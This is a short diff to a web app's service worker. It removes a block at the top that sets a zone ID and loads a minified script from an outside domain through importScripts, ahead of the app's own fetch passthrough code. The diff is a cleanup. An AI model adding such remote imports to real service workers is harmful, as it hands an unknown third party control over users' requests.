@@ -1,10 +1,3 @@
-self.options = {
-    "domain": "5gvci.com",
-    "zoneId": 11814728
-};
-self.lary = "";
-importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw');
-
 // TAEMRY FLUX Progressive Web App Service Worker (Online-Only Mode)
 // Offline caching capabilities are completely disabled per architecture requirements.
 
@@ -35,3 +28,4 @@ self.addEventListener('fetch', (event) => {
   // Let all requests go directly to the network online
   event.respondWith(fetch(event.request));
 });
+
